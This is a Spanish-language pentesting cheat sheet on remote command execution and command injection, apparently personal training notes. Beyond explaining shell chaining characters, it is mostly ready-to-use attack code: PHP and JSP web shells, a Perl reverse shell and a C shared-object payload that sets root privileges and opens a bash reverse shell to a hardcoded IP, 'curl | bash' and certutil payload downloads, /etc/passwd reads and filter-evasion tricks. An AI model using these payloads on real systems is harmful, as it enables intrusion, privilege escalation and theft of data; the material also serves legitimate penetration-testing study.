# Ejecucion Remota de Comando (RCE)

La inyección de comandos, también conocida como inyección de shell, es un tipo de ataque en el que el atacante puede ejecutar comandos arbitrarios en el sistema operativo host a través de una aplicación vulnerable. 
Esta vulnerabilidad puede existir cuando una aplicación pasa datos no seguros proporcionados por el usuario (formularios, cookies, encabezados HTTP, etc.) a un shell del sistema. En este contexto, el shell del sistema es una interfaz de línea de comandos que procesa los comandos que se ejecutarán, generalmente en un sistema Unix o Linux.

Para identificar esta vulnerabilidad debemos prestar atencion en las solicitudes y ver si se estan realizando acciones a traves de la ejecuion de comandos del sistema en el servidor como por ejemplo, hacer un ping, añadir IPs a una whitelist, eliminar archivos, etc

Ademas de los inputs de una aplicacion web tambien se puden inyectar comandos de multitud de formas:
- Consola de comandos expuesta
- Vulnerabilidades web (LFI,SQLi, SSTI, XXE,etc)
- User-Agent
  

## Caracteres de concatenacion de comandos

En muchas interfaces de línea de comandos, especialmente en sistemas tipo Unix, hay varios caracteres que se pueden utilizar para encadenar o manipular comandos.

`; (Punto y coma)`: Permite ejecutar varios comandos secuencialmente.
`&& (AND)`: Ejecuta el segundo comando solo si el primero tiene éxito (devuelve un estado de salida cero).
`|| (O)`: Ejecuta el segundo comando solo si el primero falla (devuelve un estado de salida no cero).
`& (En segundo plano)`: Ejecuta el comando en segundo plano, permitiendo al usuario seguir utilizando la terminal.
`| (Tubería)`: Toma la salida del primer comando y la utiliza como entrada para el segundo comando.
````bash
command1; command2   # Ejecuta command1 y luego command2
command1 && command2 # Ejecuta command2 solo si command1 tiene éxito
command1 || command2 # Ejecuta command2 solo si command1 falla
command1 & command2  # Ejecuta command1 en segundo plano
command1 | command2  # Conduce la salida de command1 al command2
````
Dentro de un comando

Inyección de comandos utilizando acentos graves (backticks).

````bash
original_cmd_by_server `cat /etc/passwd`
````
Inyección de comandos utilizando sustitución

````bash
original_cmd_by_server $(cat /etc/passwd)
````
## Consolas expuestas

En ocasiones podemos descubrir al hacer la enumeracion web consolas de lenguajes de programacion o incluso consolas de sistema expuestas, lo primero que debemos hacer es saber que lenguaje de programacion interpretan y a partir de ahi comenzar la ejecucion de comandos.

- PHP
````
exec
system("")
````
- Javascript
````
$()
````
- Python
````
os.system()
````
- Groovy

## Reverse shells

Recursos utiles:
- [Pentest Monkey Reverse shells Cheatsheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [Reverse Shells Builder](https://www.revshells.com)

- Python

````python
`import os
os.system("cp /bin/sh /tmp/sh;chmod u+s /tmp/sh")`
````

- PHP

````php
<? php echo shell_exec ($_GET[‘cmd’]); ?>

<? php echo shell_exec (‘<command>’); ?>

<pre>system(“<command>”)</pre>

<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>

# Windows/Linux
<?php
$command = shell_exec($_REQUEST['cmd']);
echo $command;
?>
````

- PERL

````perl
# Windows
#!/usr/bin/perl -w
use Socket;
$i="192.168.119.";
$p=443;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");
open(STDOUT,">&S");
open(STDERR,">&S");
exec("cmd.exe");
};
````

- C
````c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {

    setgid(0);
    setuid(0);
    system("bash -i >& /dev/tcp/192.168.49.86/6379 0>&1")
}
````

- JSP
````jsp
<%@ page import="java.util.*,java.io.*"%>
<html>
<head>
    <title>JSP Webshell</title>
</head>
<body>
    <form method="POST" name="myform" action="">
        <input type="text" name="cmd">
        <input type="submit" value="Execute">
    </form>
    <pre>
<%
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<br>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
        OutputStream os = p.getOutputStream();
        InputStream in = p.getInputStream();
        DataInputStream dis = new DataInputStream(in);
        String disr = dis.readLine();
        out.println("<cmd_output>");
        while ( disr != null ) {
                out.println(disr);
                disr = dis.readLine();
                }
        }
        out.println("</cmd_output>");
%>
    </pre>
</body>
</html>
````

### Linux
- Bash

````bash
# Guardar la reverse shell como index.html en nuestro http.server
curl <ip> | bash

bash -c <revshell>

/bin/bash -c <revshell>
````

### Windows
- CMD
````
cmd /c

# Reverse shell previamente generada con msfvenom
certutil <route>/shell.exe shell.exe
````

- [Nishang](https://github.com/samratashok/nishang)

Powershell ruta absoluta: `C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe`

## Bypass de filtros

Listas de caracteres y strings para hacer fuerza bruta: 
- [Command Injection Payloads](https://github.com/payloadbox/command-injection-payload-list)

### Bypass con salto de linea

- Commands can be broken into parts by using backslash followed by a newline
    
```powershell
$ cat /et\
c/pa\
sswd
```
    
- URL encoded 
    
```powershell
cat%20/et%5C%0Ac/pa%5C%0Asswd
```
    

### Bypass filtro de caracteres en hexadecimal

```powershell
swissky@crashlab:~$ echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
/etc/passwd

swissky@crashlab:~$ cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ abc=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $abc
root:x:0:0:root:/root:/bin/bash

swissky@crashlab:~$ `echo $'cat\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64'`
root:x:0:0:root:/root:/bin/bash
```

### Bypass palabras en blacklist

#### Bypass con comilla simple

```powershell
w'h'o'am'i
```

#### Bypass con dobles comillas

```powershell
w"h"o"am"i
```

#### Bypass con \ y /

```powershell
w\ho\am\i
/\b\i\n/////s\h
```

#### Bypass con $@

```powershell
who$@ami
echo whoami|$0
```

#### Bypass con $()

```powershell
who$()ami
who$(echo am)i
who`echo am`i
```


#### Bypass con wildcards

```powershell
powershell C:\*\*2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:\*\*32\c*?c.e?e # calc
```

